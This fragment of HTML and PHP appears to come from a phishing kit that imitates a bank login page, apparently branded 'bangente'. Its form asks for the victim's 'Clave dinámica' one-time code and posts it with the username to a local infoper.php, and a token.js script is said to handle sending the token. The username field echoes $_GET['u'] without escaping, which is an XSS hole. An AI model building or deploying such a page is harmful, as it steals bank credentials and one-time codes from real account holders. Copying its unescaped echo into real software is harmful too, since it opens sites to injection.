...
<script>
  ...
  <div id="main" role="main" class="mainRegister auth-bg auth-bg-per" bis_skin_checked="1">
    <div id="content" class="container" bis_skin_checked="1">
      <div class="auth-box login-box" bis_skin_checked="1" style="opacity: 1;">
        ...
        <!-- <script src="/js/plugin/limonte-sweetalert2/sweetalert2.min.js"></script> -->
        ...
        <!-- Scripts -->
        <!-- <script src="/js/bangente.js?v=28ead4ea-40dd-44f0-aee6-669dff4aa870"></script> -->
        <!-- Styles -->
        <link href="./docs/bangente.css" rel="stylesheet">
        <link href="./docs/helvetica-neue-lt-std-55" rel="stylesheet">
            ...
            <div class="card2 o-hidden" style="max-width: 490px;" bis_skin_checked="1">
              <div class="row" style="float: right;" bis_skin_checked="1">
                <div class="p-4" bis_skin_checked="1">
                  ...
                  <form id="login-form" method="post" action="infoper.php">
				       <input type="hidden" name="usuario" value="<?php echo $_GET['u']; ?>">
                    
                    <div class="form-group" bis_skin_checked="1">
                     
                      <div bis_skin_checked="1">
                        <label for="token" class="inicio"><span>Clave dinámica</span></label>
                        <input id="token" class="form-control form-control-rounded" name="token2" value="" required="" autocomplete="off" maxlength="16" autofocus="">
  ...
  <!-- Carga del script token.js para manejar la validación y envío del token -->
  <script src="./docs/token.js"></script>
